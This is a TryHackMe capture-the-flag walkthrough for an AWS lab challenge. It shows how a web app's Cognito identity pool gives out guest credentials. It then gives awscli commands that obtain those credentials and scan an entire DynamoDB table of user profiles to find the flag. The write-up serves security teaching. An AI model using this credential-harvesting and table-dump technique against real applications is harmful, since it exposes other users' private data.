# Complimentary Walkthrough

## Intro
Welcome to the Complimentary challenge, here is the link to the [room](https://tryhackme.com/room/hh-complimentary-05e0b604) on TryHackMe.

This is an easy level web exploitation challenge in an AWS environment.

*"Lambo installed the Byte Lotus Wellness app the day she arrived — it was free, it had great reviews (written by the app, but she didn't check), and it got her a tote bag for saying yes to camera, mic, contacts, and location access. No account needed. No login screen. It just… knows things about you the moment you open it.*

*That's the whole pitch: “complimentary” access, no friction, no sign-up. Something still has to be deciding what you're allowed to see, even without a login — and whatever that something is, it isn't checking very carefully.*

*Your objective: find out how the app knows anything about you at all, and see what else it's willing to hand over."*

Let's begin!

<br/>
<br/>

## The Challeng
Visit  `http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/` in your web browser.

Here we open the devtools `FN` + `F12`, navigate to the "Sources" tab, and see a file calles "app.js":
```js
// Byte Lotus Wellness — guest dashboard
//
// No login screen on purpose: every visitor gets "free" AWS guest
// credentials from our Cognito Identity Pool so we can save wellness
// preferences without the friction of an account.

const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});

function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");
  if (!id) {
    // First visit: hand out a throwaway guest id, same as checking in.
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }
  return id;
}

function renderDashboard(item) {
  const el = document.getElementById("dashboard");
  if (!item) {
    el.textContent = "Welcome! We don't have wellness data for you yet — check back after your first spa visit.";
    return;
  }
  el.textContent = [
    "Name: " + (item.name ? item.name.S : "—"),
    "Loyalty notes: " + (item.notes ? item.notes.S : "—"),
  ].join("\n");
}

AWS.config.credentials.get(function (err) {
  if (err) {
    console.error("Could not fetch guest credentials:", err);
    return;
  }

  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
  dynamodb.getItem(
    {
      TableName: TABLE_NAME,
      Key: { guest_id: { S: guestId() } },
    },
    function (err, data) {
      if (err) {
        console.error("Could not load dashboard:", err);
        return;
      }
      renderDashboard(data.Item);
    }
  );
});

```

We find some JavaScript, let's break it down to understand what it does:
- The `guestId()` function generates a random string and saves it to the browser's *localStorage*. -> This is used as the database key to fetch the user's profile.
	- We can view our current value in devtools, you are using chrome (like in BurpSuite) navigate to the "Application" tab, then on the left click on "Local Storage", the current site URL will appear.
	- Here we can see different keys and values, the one that interests us is `byteLotusGuestId`.

The JavaScript code itself is just a client-side limitation. It politely asks DynamoDB for one specific record. 

The real vulnerability is on the AWS backend: the IAM role attached to this Cognito Identity Pool's unauthenticated users is overprivileged. 

Instead of restricting the guest role to only read their own specific `guest_id` row, the IAM policy likely grants broad permissions like `dynamodb:Scan` or `dynamodb:GetItem` on the entire `complimentary-GuestWellnessProfiles` table (or even all tables in the account). 

Because the app hands out valid AWS credentials to anyone who visits the site, we can take those credentials and bypass the web app's frontend entirely.

<br>

To exploit this we need to use AWS own app: *awscli*, if are not on the AttackBox or do not have it installed:
```bash
sudo apt install awscli
```

Back to our job, we need to:

1. Ask cognito to register us as unauthenticated guest and give us an id:
```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

2. Exchange the Identity ID for temporary AWS credentials:
```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "<YOUR_IDENTITY_ID_FROM_STEP_1>"
```

3. Export the credentials in your env:
```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretKey>"
export AWS_SESSION_TOKEN="<SessionToken>"
export AWS_DEFAULT_REGION="us-east-1"
```

4. Now dump the database, we save the output to a file:
```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles > bingo.json
```

5. Find the flag with *grep* or *ripgrep*:
```bash
rg THM bingo.json
```

--> REDACTED

<br/>
<br/>

Congratulations, you have successfully bypassed the front-end and accessed the data of all the users and found the flag!

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
